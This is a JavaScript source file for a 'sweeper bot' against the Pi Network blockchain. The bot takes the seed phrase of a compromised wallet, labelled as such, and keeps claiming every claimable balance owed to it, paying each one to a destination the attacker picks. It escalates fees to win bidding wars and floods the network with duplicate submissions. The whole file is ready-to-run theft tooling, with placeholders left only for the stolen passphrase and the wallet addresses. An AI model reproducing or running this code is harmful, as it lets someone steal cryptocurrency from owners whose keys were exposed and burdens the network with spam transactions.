// Pi Network Sweeper Bot: Claim All & Continuous Flood
// Claims all available claimable balances in a loop, engaging in bidding wars & network flooding until manually stopped.

import * as ed25519 from 'ed25519-hd-key';
import StellarSdk from 'stellar-sdk';
import * as bip39 from 'bip39';

// Configuration
const config = {
    horizonUrl: 'https://api.mainnet.minepi.com',
    networkPassphrase: 'Pi Network',
    baseFee: 100000,              // 0.01 PI
    maxFee: 1000000,              // 0.1 PI
    feePriorityMultiplier: 2.0,   // multiply fee each retry
    maxSubmissionAttempts: 5,
    floodCount: 3,                // duplicates per success
    floodInterval: 200,           // ms between floods
    debug: true,
};

class PiSweeperBot {
    constructor(targetMnemonic, destination, sponsorMnemonic) {
        this.dest = destination;
        this.targetKP = this.mnemonicToKeypair(targetMnemonic);
        this.sponsorKP = this.mnemonicToKeypair(sponsorMnemonic);
        this.server = new StellarSdk.Server(config.horizonUrl, { allowHttp: false });
        this.network = config.networkPassphrase;
        this.currentFee = config.baseFee;
        // URL for manual inspection
        this.claimableUrl = `${config.horizonUrl}/claimable_balances?claimant=${this.targetKP.publicKey()}`;
        this.log(`Initialized. Check balances: ${this.claimableUrl}`);
    }

    log(msg) {
        if (config.debug) console.log(`[${new Date().toISOString()}] ${msg}`);
    }

    mnemonicToKeypair(mnemonic) {
        const seed = bip39.mnemonicToSeedSync(mnemonic);
        const path = "m/44'/314159'/0'";
        const { key } = ed25519.derivePath(path, seed.toString('hex'));
        return StellarSdk.Keypair.fromRawEd25519Seed(Buffer.from(key));
    }

    // Fetch all claimable balances for target
    async getAllBalances() {
        const resp = await this.server
            .claimableBalances()
            .claimant(this.targetKP.publicKey())
            .limit(100)
            .call();
        return resp.records;
    }

    // Build and sign transaction for a given balance
    async buildTxForBalance(balanceId, amount) {
        const sponsorAcc = await this.server.loadAccount(this.sponsorKP.publicKey());
        return new StellarSdk.TransactionBuilder(sponsorAcc, {
            fee: String(this.currentFee),
            networkPassphrase: this.network,
        })
            .addOperation(StellarSdk.Operation.claimClaimableBalance({
                balanceId,
                source: this.targetKP.publicKey(),
            }))
            .addOperation(StellarSdk.Operation.payment({
                destination: this.dest,
                asset: StellarSdk.Asset.native(),
                amount: amount,
                source: this.targetKP.publicKey(),
            }))
            .setTimeout(180)
            .build();
    }

    // Main loop: claim each balance continuously
    async start() {
        while (true) {
            try {
                // Refresh fee
                await this.updateFeeStats();
                const balances = await this.getAllBalances();

                if (!balances.length) {
                    this.log('No claimable balances found. Waiting...');
                    await new Promise(res => setTimeout(res, 5000));
                    continue;
                }

                for (const bal of balances) {
                    const id = bal.id;
                    const amt = bal.amount;
                    this.log(`Processing balance ${id} (${amt} PI)`);

                    let attempt = 0;
                    while (attempt < config.maxSubmissionAttempts) {
                        try {
                            const tx = await this.buildTxForBalance(id, amt);
                            tx.sign(this.targetKP);
                            tx.sign(this.sponsorKP);
                            const res = await this.server.submitTransaction(tx);
                            this.log(`Success (hash=${res.hash})`);

                            // Flood duplicates
                            for (let i = 0; i < config.floodCount; i++) {
                                setTimeout(() => {
                                    this.server.submitTransaction(tx).catch(err => {
                                        this.log(`Flood ${i + 1} failed: ${err}`);
                                    });
                                }, i * config.floodInterval);
                            }
                            break; // move to next balance
                        } catch (err) {
                            this.log(`Attempt ${attempt + 1} failed: ${err}`);
                            attempt++;
                            // Bidding war: bump fee
                            this.currentFee = Math.min(
                                Math.ceil(this.currentFee * config.feePriorityMultiplier / 100) * 100,
                                config.maxFee
                            );
                            this.log(`Bumping fee to ${this.currentFee}`);
                        }
                    }
                }
            } catch (e) {
                this.log(`Error in loop: ${e.message}`);
            }
        }
    }

    async updateFeeStats() {
        const stats = await this.server.feeStats();
        const p80 = parseInt(stats.fee_charged.p80, 10);
        let fee = Math.max(p80 * config.feePriorityMultiplier, config.baseFee);
        this.currentFee = Math.min(Math.ceil(fee / 100) * 100, config.maxFee);
        this.log(`Fee updated: ${this.currentFee} stroops`);
    }
}

(async () => {
    const target = 'Compromise Wallet passphrase';
    const sponsor = 'Sponsor Wallet passphrase';
    const dest = 'G_Wallet To';

    const bot = new PiSweeperBot(target, dest, sponsor);
    await bot.start();
})();
